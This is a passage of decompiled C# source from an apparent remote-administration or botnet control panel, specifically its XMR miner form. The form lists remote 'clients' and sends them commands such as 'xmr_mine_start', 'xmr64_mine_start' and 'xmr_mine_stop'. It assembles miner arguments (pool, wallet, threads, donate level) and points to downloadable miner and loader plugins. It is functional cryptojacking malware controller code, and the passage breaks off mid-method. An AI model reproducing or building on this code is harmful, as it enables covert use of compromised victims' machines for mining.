		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_1 = visualButton_2;
		visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06001007 RID: 4103 RVA: 0x00009707 File Offset: 0x00007907
	internal PictureBox vmethod_114()
	{
		return this.pictureBox_1;
	}

	// Token: 0x06001008 RID: 4104 RVA: 0x00076970 File Offset: 0x00074B70
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_115(PictureBox pictureBox_2)
	{
		EventHandler value = new EventHandler(this.method_31);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_2;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06001009 RID: 4105 RVA: 0x000769B4 File Offset: 0x00074BB4
	public void method_0(string string_0, string string_1)
	{
		if (this.vmethod_22().InvokeRequired)
		{
			this.vmethod_22().Invoke(new fMinerXMR.Delegate83(this.method_0), new object[]
			{
				string_0,
				string_1
			});
			return;
		}
		checked
		{
			if (!Class130.concurrentDictionary_4.ContainsKey(string_0))
			{
				if (Operators.CompareString(string_1, null, true) == 0)
				{
					string_1 = Class130.concurrentDictionary_3[string_0].sUser;
				}
				cMinerXMRcli cMinerXMRcli = new cMinerXMRcli();
				cMinerXMRcli.USER = string_1;
				cMinerXMRcli.Key = string_0;
				cMinerXMRcli.THREADS = "N/A";
				cMinerXMRcli.DONATE = "N/A";
				cMinerXMRcli.ALGO = "N/A";
				cMinerXMRcli.CPU = "N/A";
				cMinerXMRcli.POOL = "N/A";
				cMinerXMRcli.SHARES = "N/A";
				cMinerXMRcli.SPEED = "N/A";
				cMinerXMRcli.OPENCL = "N/A";
				cMinerXMRcli.DURATION = "N/A";
				cMinerXMRcli.bJustConnected = true;
				int num = cMinerXMRcli.idxValues.Count<string>() - 1;
				for (int i = 1; i <= num; i++)
				{
					cMinerXMRcli.idxValues[i] = "N/A";
				}
				Class130.concurrentDictionary_4.TryAdd(string_0, cMinerXMRcli);
				Class130.concurrentDictionary_4[string_0].Key = string_0;
				this.concurrentStack_0.Push(cMinerXMRcli);
			}
		}
	}

	// Token: 0x0600100A RID: 4106 RVA: 0x00076AF4 File Offset: 0x00074CF4
	public void method_1(string string_0, string[] string_1)
	{
		if (Class130.concurrentDictionary_4.ContainsKey(string_0))
		{
			if (this.vmethod_22().InvokeRequired)
			{
				this.vmethod_22().Invoke(new fMinerXMR.Delegate84(this.method_1), new object[]
				{
					string_0,
					string_1
				});
				return;
			}
			try
			{
				Class130.concurrentDictionary_4[string_0].idxValues[1] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[0], string.Empty, true) == 0, "N/A", string_1[0]));
				Class130.concurrentDictionary_4[string_0].idxValues[2] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[1], string.Empty, true) == 0, "N/A", string_1[1]));
				Class130.concurrentDictionary_4[string_0].idxValues[3] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[2], string.Empty, true) == 0, "N/A", string_1[2]));
				Class130.concurrentDictionary_4[string_0].idxValues[4] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[3], string.Empty, true) == 0, "N/A", string_1[3]));
				Class130.concurrentDictionary_4[string_0].idxValues[5] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[4], string.Empty, true) == 0, "N/A", string_1[4]));
				Class130.concurrentDictionary_4[string_0].idxValues[6] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[5], string.Empty, true) == 0, "N/A", string_1[5]));
				Class130.concurrentDictionary_4[string_0].idxValues[7] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[6], string.Empty, true) == 0, "N/A", string_1[6]));
				Class130.concurrentDictionary_4[string_0].idxValues[8] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[7], string.Empty, true) == 0 | Operators.CompareString(string_1[7], "n/a", true) == 0, "N/A", string_1[7] + " H/s"));
				Class130.concurrentDictionary_4[string_0].idxValues[9] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[8], string.Empty, true) == 0, "N/A", string_1[8]));
				Class130.concurrentDictionary_4[string_0].rejected = Conversions.ToBoolean(Interaction.IIf(string_1[5].Contains("("), true, false));
				Class130.concurrentDictionary_4[string_0].bJustConnected = false;
				this.concurrentStack_1.Push(Class130.concurrentDictionary_4[string_0]);
				return;
			}
			catch (Exception ex)
			{
				return;
			}
		}
		this.method_0(string_0, null);
		this.method_1(string_0, string_1);
	}

	// Token: 0x0600100B RID: 4107 RVA: 0x00076DD8 File Offset: 0x00074FD8
	public void method_2(string string_0)
	{
		if (Class130.concurrentDictionary_4.ContainsKey(string_0))
		{
			if (this.vmethod_22().InvokeRequired)
			{
				this.vmethod_22().Invoke(new fMinerXMR.Delegate78(this.method_2), new object[]
				{
					string_0
				});
				return;
			}
			try
			{
				this.concurrentStack_2.Push(Class130.concurrentDictionary_4[string_0]);
				ConcurrentDictionary<string, cMinerXMRcli> concurrentDictionary_ = Class130.concurrentDictionary_4;
				cMinerXMRcli cMinerXMRcli = null;
				concurrentDictionary_.TryRemove(string_0, out cMinerXMRcli);
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600100C RID: 4108 RVA: 0x00076E6C File Offset: 0x0007506C
	private void method_3(object sender, EventArgs e)
	{
		double num = 0.0;
		double num2 = 0.0;
		long num3 = 0L;
		try
		{
			FastObjectListView fastObjectListView = this.vmethod_22();
			try
			{
				foreach (object obj in fastObjectListView.Objects)
				{
					cMinerXMRcli cMinerXMRcli = (cMinerXMRcli)obj;
					if (!cMinerXMRcli.rejected)
					{
						num += Conversion.Val(cMinerXMRcli.SPEED);
					}
					else
					{
						num2 += Conversion.Val(cMinerXMRcli.SPEED);
						checked
						{
							num3 += 1L;
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (num2 > 0.0)
			{
				this.vmethod_2().Text = string.Concat(new string[]
				{
					"Miners: ",
					Conversions.ToString(this.vmethod_22().Items.Count),
					" (",
					Conversions.ToString(num3),
					" inactive)"
				});
				this.vmethod_4().Text = string.Concat(new string[]
				{
					"Speed: ",
					Conversions.ToString(num),
					" H/s (",
					Conversions.ToString(num2),
					" H/s rejected speed)"
				});
			}
			else
			{
				this.vmethod_2().Text = "Miners: " + Conversions.ToString(this.vmethod_22().Items.Count);
				this.vmethod_4().Text = "Speed: " + Conversions.ToString(num) + " H/s";
			}
			this.vmethod_24().Text = "Selected clients: " + Conversions.ToString(Class130.fMain_0.vmethod_18().SelectedObjects.Count);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600100D RID: 4109 RVA: 0x0000970F File Offset: 0x0000790F
	private void fMinerXMR_Load(object sender, EventArgs e)
	{
		this.method_4();
	}

	// Token: 0x0600100E RID: 4110 RVA: 0x00077070 File Offset: 0x00075270
	public void method_4()
	{
		base.Width = 1150;
		base.Height = 550;
		this.vmethod_22().VirtualMode = true;
		this.vmethod_22().View = View.Details;
		this.vmethod_22().FullRowSelect = true;
		this.vmethod_22().OwnerDraw = true;
		this.vmethod_22().Columns[0].Width = 160;
		this.vmethod_22().Columns[1].Width = 80;
		this.vmethod_22().Columns[2].Width = 160;
		this.vmethod_22().Columns[3].Width = 80;
		this.vmethod_22().Columns[4].Width = 80;
		this.vmethod_22().Columns[5].Width = 160;
		this.vmethod_22().Columns[6].Width = 80;
		this.vmethod_22().Columns[7].Width = 80;
		this.vmethod_22().Columns[8].Width = 100;
		this.vmethod_22().Columns[9].Width = 120;
		this.vmethod_22().GridLines = Class135.smethod_0().Gridlines;
		this.vmethod_42().Items.Add("cn/r");
		this.vmethod_42().Items.Add("rx/0");
		this.vmethod_42().Items.Add("argon2/chukwa");
		this.vmethod_42().Items.Add("argon2/wrkz");
		this.vmethod_42().Items.Add("rx/wow");
		this.vmethod_42().Items.Add("rx/loki");
		this.vmethod_42().Items.Add("cn/fast");
		this.vmethod_42().Items.Add("cn/rwz");
		this.vmethod_42().Items.Add("cn/zls");
		this.vmethod_42().Items.Add("cn/double");
		this.vmethod_42().Items.Add("cn/wow");
		this.vmethod_42().Items.Add("cn/gpu");
		this.vmethod_42().Items.Add("cn-pico");
		this.vmethod_42().Items.Add("cn/half");
		this.vmethod_42().Items.Add("cn/2");
		this.vmethod_42().Items.Add("cn/xao");
		this.vmethod_42().Items.Add("cn/rto");
		this.vmethod_42().Items.Add("cn-heavy/tube");
		this.vmethod_42().Items.Add("cn-heavy/xhv");
		this.vmethod_42().Items.Add("cn-heavy/0");
		this.vmethod_42().Items.Add("cn/1");
		this.vmethod_42().Items.Add("cn-lite/1");
		this.vmethod_42().Items.Add("cn-lite/0");
		this.vmethod_42().Items.Add("cn/0");
		this.vmethod_42().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_42().Items[0]);
		this.vmethod_44().Items.Add("Auto");
		int num = 1;
		checked
		{
			do
			{
				this.vmethod_44().Items.Add(num);
				num++;
			}
			while (num <= 128);
			this.vmethod_44().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_44().Items[0]);
			this.vmethod_56().Items.Add("Default");
			int num2 = 1;
			do
			{
				this.vmethod_56().Items.Add(num2);
				num2++;
			}
			while (num2 <= 99);
			this.vmethod_56().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_56().Items[0]);
			this.vmethod_62().Items.Add("Realtime");
			this.vmethod_62().Items.Add("High");
			this.vmethod_62().Items.Add("Above normal");
			this.vmethod_62().Items.Add("Normal");
			this.vmethod_62().Items.Add("Below normal");
			this.vmethod_62().Items.Add("Low");
			this.vmethod_62().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_62().Items[3]);
			this.vmethod_108().RunWorkerAsync();
		}
	}

	// Token: 0x0600100F RID: 4111 RVA: 0x00007348 File Offset: 0x00005548
	private void fMinerXMR_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x06001010 RID: 4112 RVA: 0x00077568 File Offset: 0x00075768
	private void method_5(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_34().Text, "example-pool.com:5555", true) == 0)
		{
			this.vmethod_34().Text = string.Empty;
			this.vmethod_34().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_34().Font, FontStyle.Regular);
			this.vmethod_34().Font = font;
		}
	}

	// Token: 0x06001011 RID: 4113 RVA: 0x000775CC File Offset: 0x000757CC
	private void method_6(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_34().Text, string.Empty, true) == 0)
		{
			this.vmethod_34().Text = "example-pool.com:5555";
			this.vmethod_34().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_34().Font, FontStyle.Italic);
			this.vmethod_34().Font = font;
		}
	}

	// Token: 0x06001012 RID: 4114 RVA: 0x00077630 File Offset: 0x00075830
	private void method_7(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_52().Text, string.Empty, true) == 0)
		{
			this.vmethod_52().Text = "(Optional)";
			this.vmethod_52().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_52().Font, FontStyle.Italic);
			this.vmethod_52().Font = font;
		}
	}

	// Token: 0x06001013 RID: 4115 RVA: 0x00077694 File Offset: 0x00075894
	private void method_8(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_52().Text, "(Optional)", true) == 0)
		{
			this.vmethod_52().Text = string.Empty;
			this.vmethod_52().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_52().Font, FontStyle.Regular);
			this.vmethod_52().Font = font;
		}
	}

	// Token: 0x06001014 RID: 4116 RVA: 0x000776F8 File Offset: 0x000758F8
	private void method_9(object sender, FormatRowEventArgs e)
	{
		try
		{
			cMinerXMRcli cMinerXMRcli = (cMinerXMRcli)e.Model;
			if (cMinerXMRcli.bJustConnected)
			{
				e.Item.BackColor = Color.LimeGreen;
			}
			else if (!cMinerXMRcli.pending_dc & !cMinerXMRcli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.White;
			}
			else if (cMinerXMRcli.pending_dc & cMinerXMRcli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.Yellow;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			else if (cMinerXMRcli.pending_dc & !cMinerXMRcli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.Red;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			if (cMinerXMRcli.rejected)
			{
				e.Item.BackColor = Color.LightGray;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06001015 RID: 4117 RVA: 0x0007784C File Offset: 0x00075A4C
	private void method_10(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_66().Text, "(Optional)", true) == 0)
		{
			this.vmethod_66().Text = string.Empty;
			this.vmethod_66().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_66().Font, FontStyle.Regular);
			this.vmethod_66().Font = font;
		}
	}

	// Token: 0x06001016 RID: 4118 RVA: 0x000778B0 File Offset: 0x00075AB0
	private void method_11(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_66().Text, string.Empty, true) == 0)
		{
			this.vmethod_66().Text = "(Optional)";
			this.vmethod_66().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_66().Font, FontStyle.Italic);
			this.vmethod_66().Font = font;
		}
	}

	// Token: 0x06001017 RID: 4119 RVA: 0x00077914 File Offset: 0x00075B14
	private void method_12(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_72().Text, string.Empty, true) == 0)
		{
			this.vmethod_72().Text = "(Optional)";
			this.vmethod_72().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_72().Font, FontStyle.Italic);
			this.vmethod_72().Font = font;
		}
	}

	// Token: 0x06001018 RID: 4120 RVA: 0x00077978 File Offset: 0x00075B78
	private void method_13(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_72().Text, "(Optional)", true) == 0)
		{
			this.vmethod_72().Text = string.Empty;
			this.vmethod_72().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_72().Font, FontStyle.Regular);
			this.vmethod_72().Font = font;
		}
	}

	// Token: 0x06001019 RID: 4121 RVA: 0x00009717 File Offset: 0x00007917
	private void method_14(object sender, EventArgs e)
	{
		this.method_15();
	}

	// Token: 0x0600101A RID: 4122 RVA: 0x000779DC File Offset: 0x00075BDC
	public void method_15()
	{
		if (Class130.fMinerXMRLogManager_0.vmethod_0().InvokeRequired)
		{
			Class130.fMinerXMRLogManager_0.vmethod_0().Invoke(new fMinerXMR.Delegate80(this.method_15), new object[0]);
			return;
		}
		checked
		{
			try
			{
				Class130.fMinerXMRLogManager_0.Visible = true;
				Class130.fMinerXMRLogManager_0.Activate();
				Form fMinerXMRLogManager_ = Class130.fMinerXMRLogManager_0;
				bool flag = false;
				Form form = fMinerXMRLogManager_;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
				Class130.fMinerXMRLogManager_0.Opacity = 100.0;
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600101B RID: 4123 RVA: 0x00077AE0 File Offset: 0x00075CE0
	private void method_16(object sender, EventArgs e)
	{
		this.method_15();
		FastObjectListView fastObjectListView = this.vmethod_22();
		if (fastObjectListView.SelectedObjects != null)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string key = ((cMinerXMRcli)obj).Key;
					string string_ = "xmr_mine_log|1";
					string string_2 = key;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x0600101C RID: 4124 RVA: 0x00077BC8 File Offset: 0x00075DC8
	private void method_17(object sender, MouseEventArgs e)
	{
		this.vmethod_82().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_22().SelectedObjects.Count > 0, true, false));
		this.vmethod_92().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_22().SelectedObjects.Count > 0, true, false));
		this.vmethod_96().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_22().SelectedObjects.Count > 0, true, false));
	}

	// Token: 0x0600101D RID: 4125 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_18(object sender, EventArgs e)
	{
	}

	// Token: 0x0600101E RID: 4126 RVA: 0x00009717 File Offset: 0x00007917
	private void method_19(object sender, EventArgs e)
	{
		this.method_15();
	}

	// Token: 0x0600101F RID: 4127 RVA: 0x00077C74 File Offset: 0x00075E74
	private void method_20(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_22();
		if (fastObjectListView.SelectedObjects != null)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string key = ((cMinerXMRcli)obj).Key;
					string string_ = "xmr_mine_stop|1";
					string string_2 = key;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06001020 RID: 4128 RVA: 0x00077D58 File Offset: 0x00075F58
	private void method_21(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_22().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06001021 RID: 4129 RVA: 0x00077DC4 File Offset: 0x00075FC4
	private void method_22(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_22();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cMinerXMRcli cMinerXMRcli = (cMinerXMRcli)obj;
					stringBuilder.Append(string.Concat(new string[]
					{
						cMinerXMRcli.USER,
						"\t",
						cMinerXMRcli.THREADS,
						"\t",
						cMinerXMRcli.POOL,
						"\t",
						cMinerXMRcli.ALGO,
						"\t",
						cMinerXMRcli.OPENCL,
						"\t",
						cMinerXMRcli.CPU,
						"\t",
						cMinerXMRcli.SHARES,
						"\t",
						cMinerXMRcli.DONATE,
						"\t",
						cMinerXMRcli.SPEED,
						"\t",
						cMinerXMRcli.DURATION,
						"\r\n"
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06001022 RID: 4130 RVA: 0x00077F34 File Offset: 0x00076134
	private void method_23(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_22();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				cMinerXMRcli cMinerXMRcli = (cMinerXMRcli)obj;
				stringBuilder.Append(string.Concat(new string[]
				{
					cMinerXMRcli.USER,
					"\t",
					cMinerXMRcli.THREADS,
					"\t",
					cMinerXMRcli.POOL,
					"\t",
					cMinerXMRcli.ALGO,
					"\t",
					cMinerXMRcli.OPENCL,
					"\t",
					cMinerXMRcli.CPU,
					"\t",
					cMinerXMRcli.SHARES,
					"\t",
					cMinerXMRcli.DONATE,
					"\t",
					cMinerXMRcli.SPEED,
					"\t",
					cMinerXMRcli.DURATION,
					"\r\n"
				}));
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x06001023 RID: 4131 RVA: 0x00007334 File Offset: 0x00005534
	private void method_24(object sender, EventArgs e)
	{
		Interaction.MsgBox("If enabled, the 64-Bit version of the XMR miner will be used, which offers a much higher hashrate.\r\n\r\nNote: This plugin is only supported on 64-Bit editions of Windows.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001024 RID: 4132 RVA: 0x00078090 File Offset: 0x00076290
	public void method_25()
	{
		if (this.vmethod_22().InvokeRequired)
		{
			this.vmethod_22().Invoke(new fMinerXMR.Delegate81(this.method_25), new object[0]);
			return;
		}
		if (this.concurrentStack_0.Count > 0)
		{
			this.vmethod_22().AddObjects(this.concurrentStack_0.ToList<cMinerXMRcli>());
			this.concurrentStack_0.Clear();
		}
	}

	// Token: 0x06001025 RID: 4133 RVA: 0x000780F8 File Offset: 0x000762F8
	public void method_26()
	{
		if (this.vmethod_22().InvokeRequired)
		{
			this.vmethod_22().Invoke(new fMinerXMR.Delegate82(this.method_26), new object[0]);
			return;
		}
		if (this.concurrentStack_1.Count > 0)
		{
			this.vmethod_22().RefreshObjects(this.concurrentStack_1.ToList<cMinerXMRcli>());
			this.concurrentStack_1.Clear();
		}
	}

	// Token: 0x06001026 RID: 4134 RVA: 0x00078160 File Offset: 0x00076360
	public void method_27()
	{
		if (this.vmethod_22().InvokeRequired)
		{
			this.vmethod_22().Invoke(new fMinerXMR.Delegate79(this.method_27), new object[0]);
			return;
		}
		if (this.concurrentStack_2.Count > 0)
		{
			this.vmethod_22().RemoveObjects(this.concurrentStack_2.ToList<cMinerXMRcli>());
			this.concurrentStack_2.Clear();
		}
	}

	// Token: 0x06001027 RID: 4135 RVA: 0x0000971F File Offset: 0x0000791F
	private void method_28(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_25();
			this.method_26();
			this.method_27();
			Thread.Sleep(1000);
		}
	}

	// Token: 0x06001028 RID: 4136 RVA: 0x000781C8 File Offset: 0x000763C8
	private void method_29(object sender, EventArgs e)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		string text3 = string.Empty;
		string text4 = string.Empty;
		string text5 = string.Empty;
		string text6 = string.Empty;
		string text7 = string.Empty;
		string text8 = string.Empty;
		string text9 = string.Empty;
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.IIf(this.vmethod_104().Checked, Application.StartupPath + "\\data\\plugins\\xmr64.plg", Application.StartupPath + "\\data\\plugins\\xmr.plg"));
		if (!File.Exists(Conversions.ToString(objectValue)))
		{
			Interaction.MsgBox(Operators.ConcatenateObject(Operators.ConcatenateObject("Plugin not found! Please make sure: ", objectValue), " exists."), MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if (!Class135.smethod_0().PluginsUpload && (Class135.smethod_0().PluginsURLXMR.Length < 8 | !Class135.smethod_0().PluginsURLXMR.Contains("://") | !Class135.smethod_0().PluginsURLXMR.Contains("http") | !Class135.smethod_0().PluginsURLXMR.Contains(".") | Operators.CompareString(Class135.smethod_0().PluginsURLXMR, "URL to plugin: http://site.com/xmr.plg", true) == 0))
		{
			Interaction.MsgBox("URL to XMR Miner plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			Class130.fSettings_0.Visible = true;
			Class130.fSettings_0.Activate();
			Class130.fSettings_0.vmethod_6().SelectedIndex = 2;
			Class130.fSettings_0.vmethod_42().Select();
			Class130.fSettings_0.vmethod_42().BackColor = Color.Red;
			return;
		}
		if (this.vmethod_34().Text.Length < 5 | !this.vmethod_34().Text.Contains(":") | Operators.CompareString(this.vmethod_34().Text, "example-pool.com:5555", true) == 0)
		{
			Interaction.MsgBox("Invalid Pool/URL of mining server!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if (this.vmethod_36().Text.Length < 1 | Operators.CompareString(this.vmethod_36().Text, "Username/wallet address", true) == 0)
		{
			Interaction.MsgBox("Invalid Username!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if (this.vmethod_44().SelectedIndex > 0)
		{
			text = " --threads " + this.vmethod_44().SelectedItem.ToString();
		}
		if (this.vmethod_56().SelectedIndex > 0)
		{
			text8 = " --donate-level=" + this.vmethod_56().SelectedItem.ToString();
		}
		if (this.vmethod_52().Text.Length > 0 & Operators.CompareString(this.vmethod_52().Text, "(Optional)", true) != 0)
		{
			text3 = " -u " + this.vmethod_52().Text;
		}
		if (this.vmethod_66().Text.Length > 0 & Operators.CompareString(this.vmethod_66().Text, "(Optional)", true) != 0)
		{
			text9 = " --user-agent \"" + this.vmethod_66().Text + "\"";
		}
		if (this.vmethod_72().Text.Length > 0 & Operators.CompareString(this.vmethod_72().Text, "(Optional)", true) != 0)
		{
			string text10 = this.vmethod_72().Text;
		}
		if (this.vmethod_50().Checked)
		{
			text4 = " --nicehash";
		}
		if (this.vmethod_60().Checked)
		{
			text5 = " --keepalive";
		}
		if (this.vmethod_70().Checked)
		{
			text6 = " --no-huge-pages";
		}
		text7 = " -u " + this.vmethod_36().Text;
		text2 = " -a " + this.vmethod_42().SelectedItem.ToString();
		if (this.vmethod_62().SelectedIndex != 3)
		{
			switch (this.vmethod_62().SelectedIndex)
			{
			}
		}
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			using (MD5 md = MD5.Create())
			{
				byte[] array = md.ComputeHash(File.ReadAllBytes(Conversions.ToString(objectValue)));
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					stringBuilder.Append(array[i].ToString("X2"));
				}
			}
			StringBuilder stringBuilder2 = new StringBuilder();
			if (this.vmethod_104().Checked)
			{
				using (MD5 md2 = MD5.Create())
				{
					byte[] array2 = md2.ComputeHash(File.ReadAllBytes(Application.StartupPath + "\\data\\plugins\\loader.plg"));
					int num2 = array2.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						stringBuilder2.Append(array2[j].ToString("X2"));
					}
				}
			}
			FastObjectListView fastObjectListView = Class130.fMain_0.vmethod_18();
			if (this.vmethod_30().Checked)
			{
				if (fastObjectListView.SelectedObjects == null)
				{
					return;
				}
				if (!Class135.smethod_0().PluginsUpload)
				{
					if (this.vmethod_104().Checked)
					{
						try
						{
							foreach (object obj in fastObjectListView.SelectedObjects)
							{
								CClient cclient = (CClient)obj;
								cclient.MINER_LAST_SETTINGS = string.Concat(new string[]
								{
									stringBuilder.ToString().ToLower(),
									"|",
									Class135.smethod_0().PluginsURLXMR64,
									"|",
									stringBuilder2.ToString().ToLower(),
									"|",
									Class135.smethod_0().PluginsURLLoader,
									"|",
									text,
									text2,
									" -o ",
									this.vmethod_34().Text,
									text7,
									text3,
									text4,
									text5,
									text6,
									text8,
									text9
								});
								string sKey = cclient.sKey;
								string string_ = "xmr64_mine_start|" + cclient.MINER_LAST_SETTINGS;
								string string_2 = sKey;
								Class136.Class138 @class = new Class136.Class138();
								@class.string_0 = string_2;
								@class.string_1 = string_;
								@class.long_0 = 0L;
								try
								{
									if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
									{
										new Thread(new ThreadStart(@class._Lambda$__0)).Start();
									}
								}
								catch (Exception ex)
								{
								}
							}
							return;
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
					try
					{
						foreach (object obj2 in fastObjectListView.SelectedObjects)
						{
							CClient cclient2 = (CClient)obj2;
							cclient2.MINER_LAST_SETTINGS = string.Concat(new string[]
							{
								stringBuilder.ToString().ToLower(),
								"|",
								Class135.smethod_0().PluginsURLXMR,
								"|",
								text,
								text2,
								" -o ",
								this.vmethod_34().Text,
								text7,
								text3,
								text4,
								text5,
								text6,
								text8,
								text9
							});
							string sKey2 = cclient2.sKey;
							string string_ = "xmr_mine_start|" + cclient2.MINER_LAST_SETTINGS;
							string string_2 = sKey2;
							Class136.Class138 @class = new Class136.Class138();
							@class.string_0 = string_2;
							@class.string_1 = string_;
							@class.long_0 = 0L;
							try
							{
								if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
								{
									new Thread(new ThreadStart(@class._Lambda$__0)).Start();
								}
							}
							catch (Exception ex2)
							{
							}
						}
						return;
					}
					finally
					{
						IEnumerator enumerator2;
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
				}
				if (this.vmethod_104().Checked)
				{
					try
					{
						foreach (object obj3 in fastObjectListView.SelectedObjects)
						{
							CClient cclient3 = (CClient)obj3;
							cclient3.MINER_LAST_SETTINGS = string.Concat(new string[]
							{
								stringBuilder.ToString().ToLower(),
								"|",
